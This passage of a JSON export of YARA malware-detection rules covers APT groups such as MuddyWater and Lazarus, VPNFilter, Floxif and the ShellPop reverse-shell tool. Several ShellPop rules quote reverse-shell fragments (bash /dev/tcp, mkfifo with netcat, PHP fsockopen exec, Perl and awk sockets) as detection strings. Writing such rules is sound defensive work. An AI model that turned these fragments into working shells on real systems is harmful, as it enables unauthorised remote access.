tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%11%\\\\scrobj.dll,NI,c:\" wide\n      $s1 = \"AppAct = \\\"SOFTWARE\\\\Microsoft\\\\Connection Manager\\\"\" fullword wide\n      $s2 = \"[DefenderService]\" fullword wide\n      $s3 = \"UnRegisterOCXs=EventManager\" fullword wide\n      $s4 = \"ShortSvcName=\\\" \\\"\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0xfeff and filesize < 1KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2018-06-12 14:54:01","description":"Detects a dropped Windows task as used by MudyWater in June 2018","minimum_yara":"1.7","name":"MAL_MuddyWater_DroppedTask_Jun18_1_RID3395","reference":"https://app.any.run/tasks/719c94eb-0a00-47cc-b583-ad4f9e25ebdb","required_modules":[],"rule_hash":"db7175839835bc2e29e54302454f21fb","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_Lazarus_Dropper_Jun18_1_RID30F7 : APT DEMO EXE FILE MAL NK {\n   meta:\n      description = \"Detects Lazarus Group Dropper\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/DrunkBinary/status/1002587521073721346\"\n      date = \"2018-06-01 13:02:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, NK\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = /%s\\\\windows10-kb[0-9]{7}.exe/ fullword ascii\n      $s2 = \"EYEJIW\" fullword ascii\n      $s3 = \"update\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 21000KB and ( pe.imphash ( ) == \"fcac768eff9896d667a7c706d70712ce\" or all of them )\n}","date":"2018-06-01 13:02:21","description":"Detects Lazarus Group Dropper","minimum_yara":"1.7","name":"APT_Lazarus_Dropper_Jun18_1_RID30F7","reference":"https://twitter.com/DrunkBinary/status/1002587521073721346","required_modules":["pe"],"rule_hash":"2e5ab44793cc3a4f8669162213309c47","score":75,"tags":["NK","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule APT_Lazarus_RAT_Jun18_2_RID2F03 : APT DEMO EXE FILE MAL NK {\n   meta:\n      description = \"Detects Lazarus Group RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/DrunkBinary/status/1002587521073721346\"\n      date = \"2018-06-01 11:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\KB\\\\Release\\\\\" ascii\n      $s3 = \"KB, Version 1.0\" fullword wide\n      $s4 = \"TODO: (c) <Company name>.  All rights reserved.\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 2 of them\n}","date":"2018-06-01 11:39:01","description":"Detects Lazarus Group RAT","minimum_yara":"1.7","name":"APT_Lazarus_RAT_Jun18_2_RID2F03","reference":"https://twitter.com/DrunkBinary/status/1002587521073721346","required_modules":[],"rule_hash":"e24e9743324976b49232860679e54d4d","score":75,"tags":["NK","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule MAL_ELF_VPNFilter_1_RID2D6A : APT DEMO FILE LINUX {\n   meta:\n      description = \"Detects VPNFilter malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-24 10:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Login=\" fullword ascii\n      $s2 = \"Password=\" fullword ascii\n      $s3 = \"%s/rep_%u.bin\" fullword ascii\n      $s4 = \"%s:%uh->%s:%hu\" fullword ascii\n      $s5 = \"Password required\" fullword ascii\n      $s6 = \"password=\" fullword ascii\n      $s7 = \"Authorization: Basic\" fullword ascii\n      $s8 = \"/tmUnblock.cgi\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 100KB and all of them\n}","date":"2018-05-24 10:30:51","description":"Detects VPNFilter malware","minimum_yara":"1.7","name":"MAL_ELF_VPNFilter_1_RID2D6A","reference":"Internal Research","required_modules":[],"rule_hash":"a1cbbc394bb8b1c191528d1ca90ff6bf","score":75,"tags":["APT","DEMO","LINUX","FILE"]},{"author":"Florian Roth","content":"rule MAL_ELF_VPNFilter_2_RID2D6B : APT DEMO FILE LINUX {\n   meta:\n      description = \"Detects VPNFilter malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-24 10:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0)\" fullword ascii\n      $s2 = \"passwordPASSWORDpassword\" fullword ascii\n      $s3 = \"/tmp/client.key\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 1000KB and all of them\n}","date":"2018-05-24 10:31:01","description":"Detects VPNFilter malware","minimum_yara":"1.7","name":"MAL_ELF_VPNFilter_2_RID2D6B","reference":"Internal Research","required_modules":[],"rule_hash":"67a6647e5aa45a28c218543894e850a4","score":75,"tags":["APT","DEMO","LINUX","FILE"]},{"author":"Florian Roth","content":"rule MAL_ELF_VPNFilter_3_RID2D6C : APT DEMO FILE LINUX {\n   meta:\n      description = \"Detects VPNFilter malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-24 10:31:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sx1 = \"User-Agent: Mozilla/6.1 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.0)\" fullword ascii\n      $sx2 = \"Execute by shell[%d]:\" fullword ascii\n      $sx3 = \"CONFIG.TOR.name:\" fullword ascii\n      $s1 = \"Executing command:  %s %s...\" fullword ascii\n      $s2 = \"/proc/%d/cmdline\" fullword ascii\n      $a1 = \"Mozilla/5.0 Firefox/50.0\" fullword ascii\n      $a2 = \"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\" fullword ascii\n      $a3 = \"Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 1000KB and ( 1 of ( $sx* ) or 2 of ( $s* ) or 2 of ( $a* ) )\n}","date":"2018-05-24 10:31:11","description":"Detects VPNFilter malware","minimum_yara":"1.7","name":"MAL_ELF_VPNFilter_3_RID2D6C","reference":"Internal Research","required_modules":[],"rule_hash":"3f63d2e28e130f444f94ee54da2e0dc8","score":75,"tags":["APT","DEMO","LINUX","FILE"]},{"author":"Florian Roth","content":"rule SUSP_ELF_Tor_Client_RID2DE4 : APT DEMO FILE LINUX SUSP {\n   meta:\n      description = \"Detects ELF Linux Tor client\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-24 10:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, LINUX, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"We needed to load a secret key from %s, but it was encrypted. Try 'tor --keygen' instead, so you can enter the passphrase.\" fullword ascii\n      $x2 = \"Received a VERSION cell with odd payload length %d; closing connection.\" fullword ascii\n      $x3 = \"Please upgrade! This version of Tor (%s) is %s, according to the directory authorities. Recommended versions are: %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and 1 of them\n}","date":"2018-05-24 10:51:11","description":"Detects ELF Linux Tor client","minimum_yara":"1.7","name":"SUSP_ELF_Tor_Client_RID2DE4","reference":"Internal Research","required_modules":[],"rule_hash":"208d049ce35e555a893e38f8bb0ff700","score":75,"tags":["APT","DEMO","LINUX","FILE","SUSP"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_TCLsh_RID2E27 : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious TCLsh popshell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:02:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"{ puts -nonewline $s \\\"shell>\\\";flush $s;gets $s c;set e \\\"exec $c\\\";if\" ascii\n   condition: \n      filesize < 1KB and 1 of them\n}","date":"2018-05-18 11:02:21","description":"Detects suspicious TCLsh popshell","minimum_yara":"1.7","name":"HKTL_shellpop_TCLsh_RID2E27","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"a17d4faead0ca2c3f967c0ad6fcd74c4","score":75,"tags":["DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_ruby_RID2E2B : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious ruby shellpop\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:03:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \");while(cmd=c.gets);IO.popen(cmd,'r'){\" ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2018-05-18 11:03:01","description":"Detects suspicious ruby shellpop","minimum_yara":"1.7","name":"HKTL_shellpop_ruby_RID2E2B","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"09f35a5a9c86c0ba7211144ac044393e","score":75,"tags":["DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_awk_RID2DAC : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious AWK Shellpop\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 10:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"awk 'BEGIN {s = \\\"/inet/tcp/0/\" ascii\n      $s2 = \"; while(42) \" ascii\n   condition: \n      filesize < 1KB and 1 of them\n}","date":"2018-05-18 10:41:51","description":"Detects suspicious AWK Shellpop","minimum_yara":"1.7","name":"HKTL_shellpop_awk_RID2DAC","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"f13a77ca8c482d7d79c3758dfec85a76","score":75,"tags":["DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_Netcat_UDP_RID3010 : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious netcat popshell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 12:23:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mkfifo fifo ; nc.traditional -u\" ascii\n      $s2 = \"< fifo | { bash -i; } > fifo\" fullword ascii\n   condition: \n      filesize < 1KB and 1 of them\n}","date":"2018-05-18 12:23:51","description":"Detects suspicious netcat popshell","minimum_yara":"1.7","name":"HKTL_shellpop_Netcat_UDP_RID3010","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"dfccbec4acd47cde75cdff95c89a2fbf","score":75,"tags":["DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_socat_RID2E83 : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious socat popshell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:17:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"socat tcp-connect\" ascii\n      $s2 = \",pty,stderr,setsid,sigint,sane\" ascii\n   condition: \n      filesize < 1KB and 2 of them\n}","date":"2018-05-18 11:17:41","description":"Detects suspicious socat popshell","minimum_yara":"1.7","name":"HKTL_shellpop_socat_RID2E83","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"e20bc3677fda7e480368a35b32f0f365","score":75,"tags":["DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_Perl_RID2DFC : DEMO HKTL {\n   meta:\n      description = \"Detects Shellpop Perl script\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 10:55:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);\" ascii\n      $ = \";STDIN->fdopen(\\\\$c,r);$~->fdopen(\\\\$c,w);s\" ascii\n   condition: \n      filesize < 2KB and 1 of them\n}","date":"2018-05-18 10:55:11","description":"Detects Shellpop Perl script","minimum_yara":"1.7","name":"HKTL_shellpop_Perl_RID2DFC","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"4a67d90418dcdab0517a990ebe007e6c","score":75,"tags":["DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_Python_RID2EEB : DEMO HKTL SCRIPT T1146 {\n   meta:\n      description = \"Detects malicious python shell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:35:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SCRIPT, T1146\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"os.putenv('HISTFILE', '/dev/null');\" ascii\n   condition: \n      filesize < 2KB and 1 of them\n}","date":"2018-05-18 11:35:01","description":"Detects malicious python shell","minimum_yara":"1.7","name":"HKTL_shellpop_Python_RID2EEB","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"e6dff79aa25dfae3ae3ed3f18cd01a8a","score":75,"tags":["DEMO","SCRIPT","T1146","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_PHP_TCP_RID2E97 : DEMO HKTL T1100 {\n   meta:\n      description = \"Detects malicious PHP shell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"php -r \\\"\\\\$sock=fsockopen\" ascii\n      $x2 = \";exec('/bin/sh -i <&3 >&3 2>&3');\\\"\" ascii\n   condition: \n      filesize < 3KB and all of them\n}","date":"2018-05-18 11:21:01","description":"Detects malicious PHP shell","minimum_yara":"1.7","name":"HKTL_shellpop_PHP_TCP_RID2E97","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"2ea721bdd34b8ba87dfbe6c3a252652d","score":75,"tags":["T1100","DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_Powershell_TCP_RID31D4 : DEMO HKTL T1086 {\n   meta:\n      description = \"Detects malicious powershell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 13:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"Something went wrong with execution of command on the target\" ascii\n      $ = \";[byte[]]$bytes = 0..65535|%{0};$sendbytes =\" ascii\n   condition: \n      filesize < 3KB and 1 of them\n}","date":"2018-05-18 13:39:11","description":"Detects malicious powershell","minimum_yara":"1.7","name":"HKTL_shellpop_Powershell_TCP_RID31D4","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"6d553713422049bf023e72f31389fec6","score":75,"tags":["DEMO","T1086","HKTL"]},{"author":"Tobias Michalski","content":"rule SUSP_Powershell_ShellCommand_May18_1_RID3475 : DEMO HKTL SUSP T1086 {\n   meta:\n      description = \"Detects a supcicious powershell commandline\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 15:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SUSP, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"powershell -nop -ep bypass -Command\" ascii\n   condition: \n      filesize < 3KB and 1 of them\n}","date":"2018-05-18 15:31:21","description":"Detects a supcicious powershell commandline","minimum_yara":"1.7","name":"SUSP_Powershell_ShellCommand_May18_1_RID3475","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"e7b7619775c90a8d973214fb149a8b1f","score":75,"tags":["SUSP","DEMO","T1086","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_Telnet_TCP_RID301B : DEMO HKTL {\n   meta:\n      description = \"Detects malicious telnet shell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 12:25:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"if [ -e /tmp/f ]; then rm /tmp/f;\" ascii\n      $x2 = \"0</tmp/f|/bin/bash 1>/tmp/f\" fullword ascii\n   condition: \n      filesize < 3KB and 1 of them\n}","date":"2018-05-18 12:25:41","description":"Detects malicious telnet shell","minimum_yara":"1.7","name":"HKTL_shellpop_Telnet_TCP_RID301B","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"a900e181c91fde4e7a61f3bc48897ac7","score":75,"tags":["DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule SUSP_shellpop_Bash_RID2DFF : DEMO HKTL SUSP {\n   meta:\n      description = \"Detects susupicious bash command\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 10:55:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"/bin/bash -i >& /dev/tcp/\" ascii\n   condition: \n      1 of them\n}","date":"2018-05-18 10:55:41","description":"Detects susupicious bash command","minimum_yara":"1.7","name":"SUSP_shellpop_Bash_RID2DFF","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"0f2f02f4710c4b99717c88c8c857ea31","score":75,"tags":["SUSP","DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_shellpop_netcat_RID2EE8 : DEMO HKTL {\n   meta:\n      description = \"Detects suspcious netcat shellpop\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if [ -e /tmp/f ]; then rm /tmp/f;\" ascii\n      $s2 = \"fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc\" ascii\n      $s4 = \"mknod /tmp/f p && nc\" ascii\n      $s5 = \"</tmp/f|/bin/bash 1>/tmp/f\" ascii\n   condition: \n      filesize < 2KB and 1 of them\n}","date":"2018-05-18 11:34:31","description":"Detects suspcious netcat shellpop","minimum_yara":"1.7","name":"HKTL_shellpop_netcat_RID2EE8","reference":"https://github.com/0x00-0x00/ShellPop","required_modules":[],"rule_hash":"4ae3f2588e5d6a0ba293521ea1f928e4","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule SUSP_LNK_File_PathTraversal_RID311F : DEMO FILE SUSP T1023 T1210 {\n   meta:\n      description = \"Detects a suspicious link file that references a file multiple folders lower than the link itself\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/05/deep-dive-into-rig-exploit-kit-delivering-grobios-trojan.html\"\n      date = \"2018-05-16 13:09:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP, T1023, T1210\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"..\\\\..\\\\..\\\\..\\\\..\\\\\" \n   condition: \n      uint16 ( 0 ) == 0x004c and uint32 ( 4 ) == 0x00021401 and ( filesize < 1KB and all of them )\n}","date":"2018-05-16 13:09:01","description":"Detects a suspicious link file that references a file multiple folders lower than the link itself","minimum_yara":"1.7","name":"SUSP_LNK_File_PathTraversal_RID311F","reference":"https://www.fireeye.com/blog/threat-research/2018/05/deep-dive-into-rig-exploit-kit-delivering-grobios-trojan.html","required_modules":[],"rule_hash":"f731f5d681534f95c3e18ca4f8879588","score":40,"tags":["SUSP","DEMO","T1023","T1210","FILE"]},{"author":"Florian Roth","content":"rule SUSP_LNK_Big_Link_File_RID2EDD : DEMO FILE SUSP T1023 T1210 {\n   meta:\n      description = \"Detects a suspiciously big LNK file - maybe with embedded content\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-15 11:32:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP, T1023, T1210\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x004c and uint32 ( 4 ) == 0x00021401 and filesize > 200KB\n}","date":"2018-05-15 11:32:41","description":"Detects a suspiciously big LNK file - maybe with embedded content","minimum_yara":"1.7","name":"SUSP_LNK_Big_Link_File_RID2EDD","reference":"Internal Research","required_modules":[],"rule_hash":"2434620a156275a9b7ede3a822bed7a4","score":65,"tags":["SUSP","DEMO","T1023","T1210","FILE"]},{"author":"Florian Roth","content":"rule MAL_Floxif_Generic_RID2DCE : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects Floxif Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-11 10:47:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"2f4ddcfebbcad3bacadc879747151f6f\" or pe.exports ( \"FloodFix\" ) or pe.exports ( \"FloodFix2\" ) )\n}","date":"2018-05-11 10:47:31","description":"Detects Floxif Malware","minimum_yara":"1.7","name":"MAL_Floxif_Generic_RID2DCE","reference":"Internal Research","required_modules":["pe"],"rule_hash":"06599060e22f16a5eb20403b471a4409","score":80,"tags":["DEMO","EXE","GEN","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_CN_FlyStudio_May18_1_RID2F5C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware / hacktool detected in May 2018\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-11 11:53:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WTNE / MADE BY E COMPILER - WUTAO \" fullword ascii\n      $s2 = \"www.cfyhack.cn\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( pe.imphash ( ) == \"65ae5cf17140aeaf91e3e9911da0ee3e\" or 1 of them )\n}","date":"2018-05-11 11:53:51","description":"Detects malware / hacktool detected in May 2018","minimum_yara":"1.7","name":"MAL_CN_FlyStudio_May18_1_RID2F5C","reference":"Internal Research","required_modules":["pe"],"rule_hash":"152b3c8cfe35e0fbd19a940bf0f865b7","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_Microsoft_Copyright_String_Anomaly_2_RID3720 : DEMO EXE FILE MAL SUSP {\n   meta:\n      description = \"Detects Floxif Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-11 17:25:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Microsoft(C) Windows(C) Operating System\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them\n}","date":"2018-05-11 17:25:11","description":"Detects Floxif Malware","minimum_yara":"1.7","name":"SUSP_Microsoft_Copyright_String_Anomaly_2_RID3720","reference":"Internal Research","required_modules":[],"rule_hash":"0248c1ff2608c6f314257bfee2cb2883","score":60,"tags":["SUSP","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_3_RID31A6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"HKEY_CLASSES_ROOT\\\\Word.Document.8\\\\shell\\\\Open\\\\command\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}","date":"2018-05-04 13:31:31","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_3_RID31A6","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"bb77559a3a161cbfff79e8bcd6a0bfce","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_7_RID31AA : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and pe.imphash ( ) == \"f5b113d6708a3927b5cc48f2215fcaff\"\n}","date":"2018-05-04 13:32:11","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_7_RID31AA","reference":"https://401trg.pw/burning-umbrella/","required_modules":["pe"],"rule_hash":"ffa6386e333fffa03aa83a01747f86b7","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_8_RID31AB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /c open %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}","date":"2018-05-04 13:32:21","description":"Detects malware sample from Burning Umbrella 